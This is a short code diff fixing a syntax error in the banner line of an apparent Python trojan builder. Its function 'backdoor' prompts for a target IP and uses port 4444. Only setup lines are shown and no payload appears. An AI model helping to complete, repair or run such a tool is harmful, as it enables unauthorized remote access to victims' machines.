@@ -37,7 +37,7 @@ print("""
 
 """)
 def backdoor():
-    f = pf Figlet(font='roman')
+    f = pf.Figlet(font='roman')
     print(f.renderText('Trojan ceator'))
     server_ip = input("target(127.0.0.1): ")
     port = 4444
